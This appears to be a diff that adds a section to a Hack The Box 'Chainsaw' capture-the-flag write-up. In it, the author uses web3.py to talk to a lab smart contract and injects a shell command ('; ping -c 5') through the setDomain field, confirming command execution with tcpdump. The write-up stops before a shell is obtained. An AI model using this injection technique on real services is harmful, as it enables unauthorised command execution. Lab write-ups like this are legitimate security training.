@@ -374,7 +374,161 @@ So now that `web3.isConnected()` returned `True`, I began attempting to exploit 
 
 ### Smart Contract Exploitation
 
+I hop into a `python3` window and get started with building my exploit. I begin by assigning the necessary parameters to communicate with the smart contract service:
 
+```python
+➜  HTB-CHAINSAW python3
+Python 3.7.5 (default, Oct 27 2019, 15:43:29) 
+[GCC 9.2.1 20191022] on linux
+Type "help", "copyright", "credits" or "license" for more information.
++>>> from web3 import Web3, HTTPProvider
++>>> import json
++>>> 
++>>> # Basic configuration variables related to smart contract verification
++... 
++>>> contract_address = '0xC727e70ded24b8D814627B53ce95cA4cF1d3e2C7'
++>>> contract_data = json.loads(open("WeaponizedPing.json", "r").read())
++>>> abi = contract_data['abi']
++>>> 
++>>> # Connection gets established
++... 
++>>> w3 = Web3(HTTPProvider('http://10.10.10.142:9810'))
++>>> w3
+<web3.main.Web3 object at 0x7fd66445de90>
+```
+
+From here, I can run `+>>> w3.eth.accounts` to achieve this output:
+
+```python
+['0x661739A860ca8b1325eA416be0E0342d1990B798', '0xE14A7540Dc365da93226e028f078201b95acbE95', '0x0F49c298997a03F7bf7666Bd05faBa483286F460', '0xC29A0F194b565D6bc20Cf58e5Ef5bB6dec58bF03', '0x5c0Fd628150215AC44eacA004FfB2AAb120035D4', '0x7Ed923F73D8C8b0C7382B871071a4b26F1542799', '0x3ef2DE965A8952e6FF5720458DA6FaDbe3210613', '0x9AA54F55b1510332b798F1cdf8EA7AECf4cB4c1D', '0x534C34980A4Fd8D3eC97850c1D5e7934786E477f', '0x8E267A00719B13a372c12946CF391B247AfB91FE']
+```
+
+And this will display all of the available addresses associated with `accounts`. So, for example, I can grab the first one like this:
+
+```python
++>>> w3.eth.accounts[0]
+'0x661739A860ca8b1325eA416be0E0342d1990B798'
+```
+
+The second one like this:
+
+```python
++>>> w3.eth.accounts[1]
+'0xE14A7540Dc365da93226e028f078201b95acbE95'
+```
+
+And, you get the point. From here, I went ahead and set my `defaultAccount` to the very first address in the list, like this:
+
+```python
++>>> w3.eth.defaultAccount = w3.eth.accounts[0]
+```
+
+Nice – So now, every time I perform a transaction, the address located at `w3.eth.accounts[0]` will be applied as the default sending address (aka, this address --> `0x661739A860ca8b1325eA416be0E0342d1990B798`)
+<p><br></p>
+
+This is great and all, but I can't really *call* anything yet. However, this is why I created the `abi` variable. After checking the Solidity documentation, I noticed I needed two things to interact with smart contracts:
+<p><br></p>
+
+1) The address of the contract (which I already found in `WeaponizedPing.json`)
+2) The `ABI`, or *Application Binary Interface* of the contract
+<p><br></p>
+
+This will essentially "load" the API and allow me to interact with it. I can do this by running this command in python:
+
+```python
++>>> contract = w3.eth.contract(abi=abi, address=contract_address)
+```
+
+And as you can see, checking the value of `contract ` gives me this result:
+
+```python
++>>> contract
+<web3._utils.datatypes.Contract object at 0x7fd664432250>
+```
+
+Looking good so far! Now I can try playing with the associated functions from `WeaponizedPing.sol`, which are `getDomain` and `setDomain`:
+
+```python
++>>> contract.functions.getDomain().call()
+'google.com'
+```
+
+Cool! It gives me the output `google.com`, which is exactly what I would expect, as that was what was already defined in the original source code.
+<p><br></p>
+
+So this got me thinking... Instead of using `getDomain()` to retrieve a domain, what if I were to use `setDomain` instead and try to ping myself? So that's exactly what I did.
+<p><br></p>
+
+I went ahead and ran `tcpdump` in order to (hopefully) receive a request back to myself via the smart contract exploit.
+
+I ran this command to get `tcpdump` running:
+
+```python
+➜  www tcpdump -i tun0 icmp -n
+tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
+listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes
+```
+
+An inferance can be made that, because the original file is called `WeaponizedPing`, it's likely that it will be accessible via ICMP.
+<p><br></p>
+
+Anyway, I then ran this command from my `python` prompt to retrieve a response:
+
+```python
++>>> contract.functions.setDomain("10.10.14.34").transact()
+HexBytes('0x081c2b06307116751929679abef5cf16a64c3912ee9b6f3cd58eec8bb7731e50')
+```
+
+Which returned this output in `tcpdump`:
+
+```python
+➜  www tcpdump -i tun0 icmp -n
+tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
+listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes
+19:14:26.706416 IP 10.10.10.142 > 10.10.14.34: ICMP echo request, id 1837, seq 1, length 64
+19:14:26.706444 IP 10.10.14.34 > 10.10.10.142: ICMP echo reply, id 1837, seq 1, length 64
+```
+
+So I knew I could get a response, but I wanted to verify this one step further.
+<p><br></p>
+
+I wanted to know if I could get command execution in a similar fashion. I attempted to do this by `ping`ing myself directly with a similar command. I achieved this by running the same `tcpdump` command, but by changing my original smart contract command to this:
+
+```python
++>>> contract.functions.setDomain("10.10.14.34; ping -c 5 10.10.14.34").transact()
+```
+
+With this command, my `tcpdump` achieved this response:
+
+```python
+➜  www tcpdump -i tun0 icmp -n
+tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
+listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes
+
+19:22:42.440642 IP 10.10.10.142 > 10.10.14.34: ICMP echo request, id 1844, seq 1, length 64
+19:22:42.440670 IP 10.10.14.34 > 10.10.10.142: ICMP echo reply, id 1844, seq 1, length 64
+
+19:22:42.484806 IP 10.10.10.142 > 10.10.14.34: ICMP echo request, id 1845, seq 1, length 64
+19:22:42.484837 IP 10.10.14.34 > 10.10.10.142: ICMP echo reply, id 1845, seq 1, length 64
+
+19:22:43.486595 IP 10.10.10.142 > 10.10.14.34: ICMP echo request, id 1845, seq 2, length 64
+19:22:43.486618 IP 10.10.14.34 > 10.10.10.142: ICMP echo reply, id 1845, seq 2, length 64
+
+19:22:44.487996 IP 10.10.10.142 > 10.10.14.34: ICMP echo request, id 1845, seq 3, length 64
+19:22:44.488015 IP 10.10.14.34 > 10.10.10.142: ICMP echo reply, id 1845, seq 3, length 64
+
+19:22:45.489770 IP 10.10.10.142 > 10.10.14.34: ICMP echo request, id 1845, seq 4, length 64
+19:22:45.489808 IP 10.10.14.34 > 10.10.10.142: ICMP echo reply, id 1845, seq 4, length 64
+
+19:22:46.491826 IP 10.10.10.142 > 10.10.14.34: ICMP echo request, id 1845, seq 5, length 64
+19:22:46.491846 IP 10.10.14.34 > 10.10.10.142: ICMP echo reply, id 1845, seq 5, length 64
+```
+
+I've broken them up to make it more apparent, but as you can see, there are clearly five (5) responses present here, exactly as I specified with my previous `ping` command.
+
+### Obtaining A Shell
+
+Now that I have crafted a working payload, I can attempt to obtain a shell given what I already know.
 
 ### Writeup still in progress... Check back later for more!
 
